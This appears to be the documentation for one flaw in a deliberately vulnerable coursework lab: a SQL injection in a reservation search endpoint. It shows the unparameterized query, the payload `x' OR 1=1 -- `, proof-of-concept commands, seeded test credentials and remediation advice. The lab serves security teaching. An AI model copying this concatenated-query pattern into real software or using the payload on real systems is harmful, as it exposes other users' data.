# V2 — SQL Injection in Reservation Search

> **Intentional coursework vulnerability.** This application is a deliberately
> vulnerable security lab (see `SECURITY-LAB-NOTICE.md`). Do not "fix" this
> query; do not deploy. All data is synthetic.

## Summary

| Item | Value |
|---|---|
| Vulnerability | SQL injection (string concatenation into a PostgreSQL query) |
| Endpoint | `POST /api/reservations/search` |
| Vulnerable parameter | `q` (body field, inside the RC4 envelope) |
| Attacker model | any authenticated user (the seeded `student` role is enough) |
| Impact | read **every user's reservations**, bypassing per-user scoping |
| Exact location | `services/api/src/routes/reservations.js` — route `/search`, comment `// VULN-V2: INTENTIONAL SQL INJECTION` |

## Why the query is intentionally vulnerable

The search is supposed to return only the caller's own reservations. The
`q` parameter is concatenated directly into the SQL string instead of being
passed as a bind parameter:

```js
// services/api/src/routes/reservations.js (route POST /search)
const { rows } = await query(
  // VULN-V2: INTENTIONAL SQL INJECTION — `q` concatenated unescaped.
  `${SELECT_LIST}
    WHERE r.user_id = $1 AND r.purpose ILIKE '%${q}%'
    ORDER BY r.starts_at DESC`,
  [req.user.userId]
);
```

With `q = "x' OR 1=1 -- "` the executed SQL becomes:

```sql
... WHERE r.user_id = 5 AND r.purpose ILIKE '%x' OR 1=1 -- %'
```

`AND` binds tighter than `OR`, so the predicate is
`(own-user AND match) OR TRUE` — every row in `reservations` is returned,
including other users'. A real application would parameterize `q` (as the
equipment endpoints already do — see the negative control).

This is the **only** intentionally injectable query in the application.
Equipment, authentication, fault reports, reservation list/create/update/
history, and every other endpoint remain parameterized. That invariant is
asserted by the Phase 3 test suite (`services/api/test/phase3.test.js`).

## Protocol requirement

The search travels **inside the RC4 envelope** like every other protected
endpoint — there is no plaintext SQLi shortcut:

1. `POST /api/session/key` → fresh `{sessionId, key}` (readable JSON over
   plain HTTP — itself a documented protocol weakness).
2. Encrypt body `{token, q}` with the session key → `{sid, alg:"RC4", data}`.
3. `POST /api/reservations/search` with that envelope.
4. Decrypt the response envelope; the rows are plain JSON.

## Seeded victim + test user

| Item | Value |
|---|---|
| Victim reservation | **id 13** — alice / `EQ-1002` (DNA Sequencer 4500), 2026-10-06 09:00–12:00 UTC, "Senior project: DNA sequencer calibration", `active` |
| Victim owner | `alice` (student) |
| Attacker | `bob` (student) — `StudentPass!23` |

`bob` has no legitimate visibility of row 13: it is not in his
`/api/reservations/list`, and an ordinary search `q = "DNA"` returns 0 rows
for him (asserted by tests 6 and 5 respectively).

## Reproduction

### Automated PoC (preferred)

```bash
docker compose exec api node scripts/poc-v2-sqli.js
```

Performs the full cycle programmatically: session key → login as bob →
control search → injected search → decrypts the response and prints the
victim row with a PASS/FAIL proof table. Exit code 0 = confirmed.

### Manual, with lab-client.js

```bash
# 1. establish session + login as bob (session/token are cached in-container)
docker compose exec api node scripts/lab-client.js \
  --endpoint /api/auth/login \
  --payload '{"username":"bob","password":"StudentPass!23"}'

# 2. control: normal search — returns []
docker compose exec api node scripts/lab-client.js \
  --endpoint /api/reservations/search --payload '{"q":"DNA"}'

# 3. injection: classic payload — returns every reservation
docker compose exec api node scripts/lab-client.js \
  --endpoint /api/reservations/search \
  --payload '{"q":"x'"'"' OR 1=1 -- "}'
```

(The awkward `'"'"'` is just shell quoting of the single quote inside a
single-quoted argument.)

## Expected response

The decrypted body is a JSON array of reservation objects. The injected
call contains the victim row:

```json
{
  "id": 13,
  "equipmentId": 2,
  "assetTag": "EQ-1002",
  "equipmentName": "DNA Sequencer 4500",
  "userId": 4,
  "ownerUsername": "alice",
  "ownerDisplayName": "Alice Anderson",
  "startsAt": "2026-10-06T09:00:00.000Z",
  "endsAt": "2026-10-06T12:00:00.000Z",
  "purpose": "Senior project: DNA sequencer calibration",
  "status": "active",
  "createdAt": "..."
}
```

## Exact proof of the authorization bypass

All of the following are asserted by `services/api/test/phase3.test.js`
(tests 5–7) and by `scripts/poc-v2-sqli.js`:

1. **Control (test 5):** `alice` searching `q = "DNA"` sees only her own
   rows — every returned row has `ownerUsername: "alice"`.
2. **Negative (test 6):** `bob` searching `q = "DNA"` gets **0 rows**, and
   row 13 is absent from his `/api/reservations/list`.
3. **Injection (test 7):** `bob` searching `q = "x' OR 1=1 -- "` gets all
   32+ seeded reservations **including row 13 with `ownerUsername:
   "alice"`** — a reservation bob can neither list nor fetch by any
   legitimate endpoint. The bypass is visible entirely in the API
   response; no database access is needed.

## Negative controls

| # | Check | Where |
|---|---|---|
| 1 | Normal search returns only own results | phase3 test 5 |
| 2 | Ordinary search cannot retrieve another user's reservation | phase3 test 6 |
| 3 | Intended payload retrieves the seeded cross-user reservation | phase3 test 7 |
| 4 | Unrelated endpoint (equipment filter `q`) stays parameterized: same payload shape returns 200 with 0 rows | phase3 test 8 (+ phase2 test 11) |
| 5 | Unauthenticated requests rejected: no token → 401 `auth_required`; plaintext JSON → 400 `missing_sid` | phase3 test 9 |
| 6 | Invalid RC4 sessions rejected: unknown sid → 401, bad ciphertext → 400 | phase3 test 9 |

## Remediation guidance

In a real application:

* pass `q` as a bind parameter (`ILIKE '%' || $2 || '%'`), exactly as
  every other query in this codebase already does;
* keep per-user scoping in the same predicate and add defense in depth
  with a least-privilege DB role that cannot read other users' rows;
* add request validation at the boundary (length/format limits on
  free-text search input);
* test with static analysis or a linter rule that flags string
  interpolation into SQL.

Do **not** apply any of this to the lab build: the injectable query is
the coursework vulnerability, and the exercises depend on it.

## Reset procedure

```bash
docker compose down -v      # drops the database volume
docker compose up -d --wait # re-applies schema + seed (row 13 restored)
```

The test suites mutate only synthetic rows they create themselves (a few
far-future `P3 verification …` reservations); the victim row 13 is never
modified, and both suites are safe to re-run.
